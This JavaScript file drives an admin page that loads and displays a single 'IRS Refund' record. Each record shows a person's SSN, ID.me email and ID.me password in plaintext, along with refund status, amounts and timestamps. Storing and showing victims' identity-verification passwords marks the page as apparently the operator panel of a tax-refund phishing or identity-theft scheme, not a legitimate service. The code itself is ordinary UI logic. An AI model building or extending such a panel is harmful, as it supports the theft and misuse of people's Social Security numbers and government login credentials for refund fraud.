(function () {
  function hideLoader() {
    const el = document.getElementById('pageLoader');
    if (!el) return;
    el.classList.remove('active');
    setTimeout(() => {
      if (el.parentNode) el.remove();
    }, 400);
  }

  function populateAdminUI(user) {
    if (!user) return;
    const fullName =
      `${user.firstname || ''} ${user.midname || ''} ${user.lastname || ''}`
        .replace(/\s+/g, ' ')
        .trim() || 'Admin';
    const avatar =
      user.image ||
      `https://ui-avatars.com/api/?name=${encodeURIComponent(fullName)}&background=0ea5e9&color=fff`;

    const nameEl = document.getElementById('admin-name');
    const emailEl = document.getElementById('admin-email');
    const avatarEl = document.getElementById('admin-avatar');

    if (nameEl) nameEl.textContent = fullName;
    if (emailEl) emailEl.textContent = user.email || '—';
    if (avatarEl) {
      avatarEl.src = avatar;
      avatarEl.alt = fullName;
    }
  }

  function statusClass(status) {
    const s = String(status || 'pending').toLowerCase();
    if (s === 'approved') return 'bg-green-100 text-green-800';
    if (s === 'rejected') return 'bg-red-100 text-red-800';
    if (s === 'sent') return 'bg-purple-100 text-purple-800';
    if (s === 'received') return 'bg-blue-100 text-blue-800';
    return 'bg-yellow-100 text-yellow-800';
  }

  function formatDate(value) {
    if (!value) return '—';
    try {
      return new Date(value).toLocaleString();
    } catch (_) {
      return '—';
    }
  }

  function renderRefund(refund) {
    const fullName = refund.fullName || '—';
    const statusRaw = refund.status || 'pending';
    const statusLabel =
      statusRaw.charAt(0).toUpperCase() + String(statusRaw).slice(1);
    const amount = Number(refund.refundAmount || 0).toFixed(2);

    document.getElementById('refund-title').textContent =
      `${fullName} - IRS Refund`;
    document.getElementById('refund-subtitle').textContent =
      `${statusLabel} - $${amount}`;

    document.getElementById('field-fullName').textContent = fullName;
    document.getElementById('field-ssn').textContent = refund.ssn || '—';
    document.getElementById('field-idmeEmail').textContent =
      refund.idmeEmail || '—';
    document.getElementById('field-idmePassword').textContent =
      refund.idmePassword || '—';
    document.getElementById('field-country').textContent = refund.country || '—';

    const statusEl = document.getElementById('field-status');
    statusEl.textContent = statusLabel;
    statusEl.className =
      'inline-flex px-3 py-1 text-sm font-medium rounded-full ' +
      statusClass(statusRaw);

    document.getElementById('field-amount').textContent = `$${amount}`;

    const rejectionWrap = document.getElementById('rejection-wrap');
    if (refund.rejectionReason) {
      rejectionWrap.classList.remove('hidden');
      document.getElementById('field-rejection').textContent =
        refund.rejectionReason;
    } else {
      rejectionWrap.classList.add('hidden');
    }

    const user = refund.user || {};
    document.getElementById('user-name').textContent =
      `${user.firstname || '—'} ${user.lastname || ''}`.replace(/\s+/g, ' ').trim();
    document.getElementById('user-email').textContent = user.email || '—';
    document.getElementById('user-phone').textContent = user.phone || '—';
    document.getElementById('user-country').textContent = user.country || '—';

    document.getElementById('field-created').textContent = formatDate(
      refund.createdAt
    );
    document.getElementById('field-received').textContent = formatDate(
      refund.receivedAt
    );
    document.getElementById('field-approved').textContent = formatDate(
      refund.approvedAt
    );
    document.getElementById('field-sent').textContent = formatDate(
      refund.sentAt
    );
    document.getElementById('field-rejected').textContent = formatDate(
      refund.rejectedAt
    );

    const editBtn = document.getElementById('edit-refund-btn');
    if (editBtn && refund._id) {
      editBtn.href = `editRefund.html?id=${refund._id}`;
    }
  }

  async function loadRefund() {
    const params = new URLSearchParams(window.location.search);
    const id = params.get('id');

    if (!id) {
      Swal.fire({
        icon: 'error',
        title: 'Missing ID',
        text: 'No refund ID provided',
        confirmButtonColor: '#0ea5e9'
      }).then(() => {
        window.location.href = 'allRefund.html';
      });
      return;
    }

    try {
      if (typeof api === 'undefined') {
        throw new Error('API client not loaded. Check config.js');
      }

      const res = await api.get(`/viewRefund/${id}`);
      const data = res.data;

      if (!data || data.success === false || !data.refund) {
        throw new Error(data?.message || 'Refund not found');
      }

      const adminUser =
        data.admin || data.user || (typeof getCurrentUser === 'function' ? getCurrentUser() : null);
      if (adminUser) {
        localStorage.setItem('user', JSON.stringify(adminUser));
        populateAdminUI(adminUser);
      }

      renderRefund(data.refund);
    } catch (err) {
      console.error('View refund error:', err);
      if (err.response?.status === 401) {
        if (typeof logout === 'function') logout();
        else {
          localStorage.removeItem('token');
          localStorage.removeItem('user');
          window.location.href = 'login.html';
        }
        return;
      }

      Swal.fire({
        icon: 'error',
        title: 'Error',
        text: err.response?.data?.message || err.message || 'Failed to load refund',
        confirmButtonColor: '#0ea5e9'
      }).then(() => {
        window.location.href = 'allRefund.html';
      });
    } finally {
      hideLoader();
      lucide.createIcons();
    }
  }

  document.addEventListener('DOMContentLoaded', () => {
    if (typeof requireAuthPage === 'function') {
      requireAuthPage();
    } else if (typeof isLoggedIn === 'function' && !isLoggedIn()) {
      window.location.href = 'login.html';
      return;
    } else if (!localStorage.getItem('token')) {
      window.location.href = 'login.html';
      return;
    }

    loadRefund();
  });

  window.addEventListener('load', () => {
    lucide.createIcons();
  });
})();